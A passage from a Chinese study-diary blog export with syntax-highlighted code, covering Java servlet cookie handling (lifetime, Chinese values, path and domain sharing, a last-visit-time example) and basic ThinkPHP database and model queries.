class="type">IOException</span> &#123;</span><br><span class="line">        <span class="comment">//1.创建Cookie</span></span><br><span class="line">        <span class="type">Cookie</span> c1=<span class="keyword">new</span> <span class="type">Cookie</span>(<span class="string">"msg"</span>,<span class="string">"setMaxAge"</span>);</span><br><span class="line">        <span class="comment">//2. 设置Cookie的存活时间</span></span><br><span class="line">        c1.setMaxAge(<span class="number">30</span>); <span class="comment">//将cookie持久化到硬盘，持久化30秒，30秒后自动删除cookie文件</span></span><br><span class="line">        <span class="comment">//3.发送Coookie</span></span><br><span class="line">        response.addCookie(c1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void doGet(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.doPost(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>先访问demo4，再访问demo2，30秒内无论你重新开启浏览器，cookie都会获取到，30秒后再次访问demo2就获取不到了</p>
<p>运行结果<br><figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">msg : <span class="type">setMaxAge</span></span><br><span class="line">Phpstorm-d069594e : 0<span class="type">d583fa6</span>-ad80-<span class="number">4735</span>-a385-c10cee7ee32f</span><br></pre></td></tr></table></figure></p>
<p>负数就是默认的，不演示了，零的操作也很简单，先设置一个持久化访问之后获取cookie，再重新设置为0，再次访问并获取</p>
<h4 id="问题3"><a href="#问题3" class="headerlink" title="问题3"></a>问题3</h4><ul>
<li><p>在tomcat 8 之前 cookie中不能直接存储中文数据</p>
<ul>
<li>需要将中文数据转码—一般采用URL编码(%E3)，特殊字符不支持，建议使用URL编码存储，URL解码来解析</li>
</ul>
</li>
<li><p>在tomcat 8 之后 cookie支持中文数据</p>
</li>
</ul>
<p>demo5<br><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.cookie;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.<span class="type">ServletException</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">Cookie</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServlet</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletRequest</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletResponse</span>;</span><br><span class="line"><span class="keyword">import</span> java.io.<span class="type">IOException</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Cookie快速入门</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">demo5</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void doPost(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line">        <span class="comment">//1.创建Cookie</span></span><br><span class="line">        <span class="type">Cookie</span> c1=<span class="keyword">new</span> <span class="type">Cookie</span>(<span class="string">"msg"</span>,<span class="string">"你好"</span>);</span><br><span class="line">        <span class="comment">//3.发送Coookie</span></span><br><span class="line">        response.addCookie(c1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void doGet(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.doPost(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">msg : 你好</span><br><span class="line">Phpstorm-d069594e : 0<span class="type">d583fa6</span>-ad80-<span class="number">4735</span>-a385-c10cee7ee32f</span><br></pre></td></tr></table></figure></p>
<h4 id="问题4"><a href="#问题4" class="headerlink" title="问题4"></a>问题4</h4><ul>
<li><p>假设在一个tomcat服务器中，部署了多个web项目，那么在这些web项目中cookie能不能共享？</p>
<ul>
<li><p>默认情况下cookie不能共享</p>
</li>
<li><p>setPath(String path)：设置cookie的获取范围。默认情况下，设置当前的虚拟目录</p>
<ul>
<li>如果要共享，则可以将path设置为”/“，代表根路径</li>
</ul>
</li>
</ul>
</li>
<li><p>不同的tomcat服务器间cookie共享问题？</p>
<ul>
<li><p>setDomain(String path)：如果设置一级域名相同，那么多个服务器之间cookie可以共享</p>
<ul>
<li>setDomain(“.baidu.com”)，那么tieba.baidu.com和new.baidu.com中cookie可以共享</li>
</ul>
</li>
</ul>
</li>
</ul>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.cookie;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.<span class="type">ServletException</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">Cookie</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServlet</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletRequest</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletResponse</span>;</span><br><span class="line"><span class="keyword">import</span> java.io.<span class="type">IOException</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Cookie快速入门</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">demo5</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void doPost(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line">        <span class="comment">//1.创建Cookie</span></span><br><span class="line">        <span class="type">Cookie</span> c1=<span class="keyword">new</span> <span class="type">Cookie</span>(<span class="string">"msg"</span>,<span class="string">"你好"</span>);</span><br><span class="line">        <span class="comment">//2. 设置cookie共享范围</span></span><br><span class="line">        c1.setPath(<span class="string">"/"</span>);</span><br><span class="line">        <span class="comment">//3.发送Coookie</span></span><br><span class="line">        response.addCookie(c1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void doGet(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.doPost(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>像这样的话，在同一个服务器下的模块都可以共享这个cookie</p>
<h2 id="特点-amp-作用"><a href="#特点-amp-作用" class="headerlink" title="特点&amp;作用"></a>特点&amp;作用</h2><ol>
<li><p>cookie存储数据在客户端浏览器</p>
</li>
<li><p>浏览器对于单个cookie的大小有限制以及对同一域名下的总cookie数量也有限制</p>
</li>
</ol>
<ul>
<li><p>作用：</p>
<ol>
<li><p>cookie一般用于存储少量的不太敏感的数据</p>
</li>
<li><p>在不登录的情况下，完成服务器对客户端的身份识别</p>
</li>
</ol>
</li>
</ul>
<h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><ol>
<li><p>需求：</p>
<ol>
<li><p>访问一个Servlet，如果是第一次访问，则提示：您好，欢迎首次访问</p>
</li>
<li><p>如果不是第一次访问，则提示，欢迎回来，您上次访问时间为：显示字符串</p>
</li>
</ol>
</li>
<li><p>分析：</p>
<ol>
<li><p>可以采用cookie来完成</p>
</li>
<li><p>在服务器中的Servlet判断是否有一个名为lastTime的cookie</p>
<ol>
<li><p>有：不是第一次访问</p>
</li>
<li><p>没有：是第一次访问</p>
<ol>
<li><p>响应数据：您好，欢迎首次访问</p>
</li>
<li><p>写回cookie：lastTime=时间</p>
</li>
</ol>
</li>
</ol>
</li>
</ol>
</li>
</ol>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">package cn.itcast.cookie;</span><br><span class="line"></span><br><span class="line">import javax.servlet.ServletException;</span><br><span class="line">import javax.servlet.http.Cookie;</span><br><span class="line">import javax.servlet.http.HttpServlet;</span><br><span class="line">import javax.servlet.http.HttpServletRequest;</span><br><span class="line">import javax.servlet.http.HttpServletResponse;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.net.URLDecoder;</span><br><span class="line">import java.net.URLEncoder;</span><br><span class="line">import java.text.SimpleDateFormat;</span><br><span class="line">import java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> 在服务器中的Servlet判断是否有一个名为lastTime的cookie</span></span><br><span class="line"><span class="comment"> 1. 有：不是第一次访问</span></span><br><span class="line"><span class="comment">    1. 响应数据：欢迎回来，您上次访问时间为：时间</span></span><br><span class="line"><span class="comment"> 2. 没有：是第一次访问</span></span><br><span class="line"><span class="comment">    1. 响应数据：您好，欢迎首次访问</span></span><br><span class="line"><span class="comment">    2. 写回cookie：lastTime=时间</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">public <span class="keyword">class</span> CookieTest extends HttpServlet &#123;</span><br><span class="line">    @Override</span><br><span class="line">    protected void <span class="keyword">do</span><span class="constructor">Post(HttpServletRequest <span class="params">request</span>, HttpServletResponse <span class="params">response</span>)</span> throws ServletException, IOException &#123;</span><br><span class="line">        <span class="comment">//设置响应的消息体的数据格式以及编码</span></span><br><span class="line">        response.set<span class="constructor">ContentType(<span class="string">"text/html;charset=utf-8"</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//1.获取所有的cookie</span></span><br><span class="line">        Cookie<span class="literal">[]</span> cs = request.get<span class="constructor">Cookies()</span>;</span><br><span class="line">        boolean flag=<span class="literal">false</span>; <span class="comment">//没有cookie为false</span></span><br><span class="line">        <span class="comment">//2.遍历cookie数组</span></span><br><span class="line">        <span class="keyword">if</span> (cs!=null&amp;&amp;cs.length&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            for (Cookie c : cs) &#123;</span><br><span class="line">                <span class="comment">//3.获取cookie的名称</span></span><br><span class="line">                String name = c.get<span class="constructor">Name()</span>;</span><br><span class="line">                <span class="comment">//4.判断名称是否是lastTime</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="string">"lastTime"</span>.equals(name))&#123;</span><br><span class="line">                    <span class="comment">//有该cookie，不是第一次访问</span></span><br><span class="line">                    flag=<span class="literal">true</span>;<span class="comment">//有lastTime的cookie</span></span><br><span class="line">                    <span class="comment">//设置cookie的value</span></span><br><span class="line">                    <span class="comment">//获取当前时间的字符串，重新设置cookie的值，重新发送cookie</span></span><br><span class="line">                    Date date=<span class="keyword">new</span> <span class="constructor">Date()</span>;</span><br><span class="line">                    SimpleDateFormat sdf=<span class="keyword">new</span> <span class="constructor">SimpleDateFormat(<span class="string">"yyyy年MM月dd日 HH:mm:ss"</span>)</span>;</span><br><span class="line">                    String str_date = sdf.format(date);</span><br><span class="line">                    <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="string">"编码前"</span>+str_date);</span><br><span class="line">                    <span class="comment">//URL编码</span></span><br><span class="line">                    str_date=<span class="module-access"><span class="module"><span class="identifier">URLEncoder</span>.</span></span>encode(str_date,<span class="string">"utf-8"</span>);</span><br><span class="line">                    <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="string">"编码后"</span>+str_date);</span><br><span class="line">                    c.set<span class="constructor">Value(<span class="params">str_date</span>)</span>;</span><br><span class="line">                    <span class="comment">//设置cookie的存活时间</span></span><br><span class="line">                    c.set<span class="constructor">MaxAge(60<span class="operator">*</span>60<span class="operator">*</span>24<span class="operator">*</span>30)</span>;<span class="comment">//一个月</span></span><br><span class="line">                    response.add<span class="constructor">Cookie(<span class="params">c</span>)</span>;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">//响应数据</span></span><br><span class="line">                    <span class="comment">//获取cookie的value,时间</span></span><br><span class="line">                    String value = c.get<span class="constructor">Value()</span>;</span><br><span class="line">                    <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="string">"解码前"</span>+value);</span><br><span class="line">                    <span class="comment">//URL解码</span></span><br><span class="line">                    value=<span class="module-access"><span class="module"><span class="identifier">URLDecoder</span>.</span></span>decode(value,<span class="string">"utf-8"</span>);</span><br><span class="line">                    <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="string">"解码后"</span>+value);</span><br><span class="line">                    response.get<span class="constructor">Writer()</span>.write(<span class="string">"&lt;h1&gt;欢迎回来，您上次访问时间为："</span>+value+<span class="string">"&lt;/h1&gt;"</span>);</span><br><span class="line"></span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (cs==null<span class="operator"> || </span>cs.length==<span class="number">0</span><span class="operator"> || </span>flag==<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="comment">//没有，第一次访问</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">//设置cookie的value</span></span><br><span class="line">            <span class="comment">//获取当前时间的字符串，重新设置cookie的值，重新发送cookie</span></span><br><span class="line">            Date date=<span class="keyword">new</span> <span class="constructor">Date()</span>;</span><br><span class="line">            SimpleDateFormat sdf=<span class="keyword">new</span> <span class="constructor">SimpleDateFormat(<span class="string">"YYYY年MM月dd日 HH:mm:ss"</span>)</span>;</span><br><span class="line">            String str_date = sdf.format(date);</span><br><span class="line">            <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="string">"编码前"</span>+str_date);</span><br><span class="line">            <span class="comment">//URL编码</span></span><br><span class="line">            str_date=<span class="module-access"><span class="module"><span class="identifier">URLEncoder</span>.</span></span>encode(str_date,<span class="string">"utf-8"</span>);</span><br><span class="line">            <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="string">"编码后"</span>+str_date);</span><br><span class="line"></span><br><span class="line">            Cookie c=<span class="keyword">new</span> <span class="constructor">Cookie(<span class="string">"lastTime"</span>, <span class="params">str_date</span>)</span>;</span><br><span class="line">            c.set<span class="constructor">Value(<span class="params">str_date</span>)</span>;</span><br><span class="line">            <span class="comment">//设置cookie的存活时间</span></span><br><span class="line">            c.set<span class="constructor">MaxAge(60<span class="operator">*</span>60<span class="operator">*</span>24<span class="operator">*</span>30)</span>;<span class="comment">//一个月</span></span><br><span class="line">            response.add<span class="constructor">Cookie(<span class="params">c</span>)</span>;</span><br><span class="line"></span><br><span class="line">            response.get<span class="constructor">Writer()</span>.write(<span class="string">"&lt;h1&gt;您好，欢迎首次访问&lt;/h1&gt;"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    protected void <span class="keyword">do</span><span class="constructor">Get(HttpServletRequest <span class="params">request</span>, HttpServletResponse <span class="params">response</span>)</span> throws ServletException, IOException &#123;</span><br><span class="line">        this.<span class="keyword">do</span><span class="constructor">Post(<span class="params">request</span>, <span class="params">response</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首次运行<br><img src="/img/JavaWeb/8-3学习日记/0.png" alt="avatar"></p>
<p>控制台结果<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">编码前<span class="number">2020</span>年<span class="number">08</span>月<span class="number">03</span>日 <span class="number">16</span>:<span class="number">42</span>:<span class="number">07</span></span><br><span class="line">编码后<span class="number">2020</span>%E5%B9%B408%E6%<span class="number">9</span>C%<span class="number">8803</span>%E6%<span class="number">97</span>%A5+<span class="number">16</span>%<span class="number">3</span>A42%<span class="number">3</span>A07</span><br><span class="line">解码前<span class="number">2020</span>%E5%B9%B408%E6%<span class="number">9</span>C%<span class="number">8803</span>%E6%<span class="number">97</span>%A5+<span class="number">16</span>%<span class="number">3</span>A42%<span class="number">3</span>A07</span><br><span class="line">解码后<span class="number">2020</span>年<span class="number">08</span>月<span class="number">03</span>日 <span class="number">16</span>:<span class="number">42</span>:<span class="number">07</span></span><br><span class="line">编码前<span class="number">2020</span>年<span class="number">08</span>月<span class="number">03</span>日 <span class="number">16</span>:<span class="number">42</span>:<span class="number">09</span></span><br><span class="line">编码后<span class="number">2020</span>%E5%B9%B408%E6%<span class="number">9</span>C%<span class="number">8803</span>%E6%<span class="number">97</span>%A5+<span class="number">16</span>%<span class="number">3</span>A42%<span class="number">3</span>A09</span><br></pre></td></tr></table></figure><br>再次刷新一下<br><img src="/img/JavaWeb/8-3学习日记/1.png" alt="avatar"></p>
<p>控制台结果<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">编码前<span class="number">2020</span>年<span class="number">08</span>月<span class="number">03</span>日 <span class="number">16</span>:<span class="number">43</span>:<span class="number">42</span></span><br><span class="line">编码后<span class="number">2020</span>%E5%B9%B408%E6%<span class="number">9</span>C%<span class="number">8803</span>%E6%<span class="number">97</span>%A5+<span class="number">16</span>%<span class="number">3</span>A43%<span class="number">3</span>A42</span><br><span class="line">解码前<span class="number">2020</span>%E5%B9%B408%E6%<span class="number">9</span>C%<span class="number">8803</span>%E6%<span class="number">97</span>%A5+<span class="number">16</span>%<span class="number">3</span>A43%<span class="number">3</span>A42</span><br><span class="line">解码后<span class="number">2020</span>年<span class="number">08</span>月<span class="number">03</span>日 <span class="number">16</span>:<span class="number">43</span>:<span class="number">42</span></span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>Java开发</category>
        <category>JavaWeb</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP-2020/8/3-ThinkPHP-2</title>
    <url>/2020/08/03/PHP-2020-8-3-%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="ThinkPHP"><a href="#ThinkPHP" class="headerlink" title="ThinkPHP"></a>ThinkPHP</h1><h2 id="数据库与模型"><a href="#数据库与模型" class="headerlink" title="数据库与模型"></a>数据库与模型</h2><h3 id="连接数据库"><a href="#连接数据库" class="headerlink" title="连接数据库"></a>连接数据库</h3><ol>
<li><p>ThinkPHP采用内置抽象层将不同的数据库操作进行封装处理</p>
</li>
<li><p>数据抽象层基于PDO模式，无须针对不同的数据库编写相应的代码</p>
</li>
<li><p>在根目录下的config下的database.php可以设置数据库连接信息</p>
</li>
<li><p>type属性默认支持的数据库有mysql,sqlite,pgsql,sqlsrv</p>
</li>
</ol>
<p>先在config下的database.php中，根据自己的情况设置好</p>
<p>之后创建一个DataTest的类,这个是一个不结合model处理的</p>
<p>DataTest.php<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Db</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">DataTest</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="string">'index'</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNoModelData</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        $data=Db::table(<span class="string">"student"</span>)-&gt;select();</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> json($data);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><br>浏览器上就可以正常看到数据了，建议用firefox查看</p>
<h3 id="模型定义"><a href="#模型定义" class="headerlink" title="模型定义"></a>模型定义</h3><ol>
<li><p>在MVC中，已经使用过Controller,View,Model</p>
</li>
<li><p>Model就是模型，就是处理和配置数据库的相关信息</p>
</li>
<li><p>在根目录创建model文件夹，并创建Student.php;该文件需要与数据库表名一致</p>
</li>
</ol>
<p>Student.php<br><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">namespace app\index\model;</span><br><span class="line">use think\<span class="type">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>继承model之后，什么都不用写，实际上它已经是个数据库的表了</p>
<p>回到DataTest.php中修改<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">model</span>\<span class="title">Student</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Db</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">DataTest</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="string">'index'</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNoModelData</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        $data=Db::table(<span class="string">"student"</span>)-&gt;select();</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> json($data);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getModelData</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">       $data= Student::select();</span></span><br><span class="line"><span class="php">       <span class="keyword">return</span> json($data);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><br>URL访问getmodeldata，发现就出来了，比没用model要简单很多</p>
<p>如果想要知道查询的流程，可以在app.php配置文件中打开应用Trace，修改完之后就不能使用json输出了，需要html输出，所以修改DataTest.php</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">model</span>\<span class="title">Student</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Db</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">DataTest</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="string">'index'</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNoModelData</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        $data=Db::table(<span class="string">"student"</span>)-&gt;select();</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> json($data);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getModelData</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">       $data= Student::select();</span></span><br><span class="line"><span class="php"><span class="comment">//       return json($data);</span></span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>
<p>将return注释掉，再访问之后右下角就可以看到具体的流程了</p>
<h3 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h3><h4 id="基本查询"><a href="#基本查询" class="headerlink" title="基本查询"></a>基本查询</h4><ol>
<li><p>Db::table()中table必须指定完整数据表</p>
</li>
<li><p>如果只希望查询一条语句，可以使用find()方法</p>
</li>
<li><p>Db::getLastSql()方法，可以得到最近一条SQL查询的原生语句</p>
</li>
<li><p>想指定数据查询，可以使用where()方法</p>
</li>
<li><p>没有查询到任何值，则会返回null</p>
</li>
<li><p>使用findOrFail()方法可以查询一条数据，在没有数据时抛出一个异常；使用findOrEmpty()也可以查询一条数据，在没有数据时返回一个空数组</p>
</li>
<li><p>查询多列使用select()方法，select()以数组形式返回，与find同样有selectOrFail()和selectOrEmpty(),同样是以数组形式返回</p>
</li>
<li><p>通过value方法可以查询指定字段的单值，没有返回null</p>
</li>
<li><p>column()方法可以查询指定列的值(多个)，没有返回空数组</p>
</li>
</ol>
<h5 id="find"><a href="#find" class="headerlink" title="find()"></a>find()</h5><p>DataTest1.php<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">model</span>\<span class="title">Student</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Db</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">DataTest1</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        $data=Db::table(<span class="string">'student'</span>)-&gt;find();</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> json($data);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">"sno"</span>:<span class="string">"18008001"</span>,<span class="attr">"sname"</span>:<span class="string">"刘昊然"</span>,<span class="attr">"ssex"</span>:<span class="literal">null</span>,<span class="attr">"sage"</span>:<span class="number">23</span>,<span class="attr">"sdept"</span>:<span class="string">"IS"</span>&#125;</span><br></pre></td></tr></table></figure><br>默认查询第一条数据，还可以进行指定，指定的标准是根据主键来进行查询的，例如查询第二个同学的数据，第二个同学学号为18008002，为主键</p>
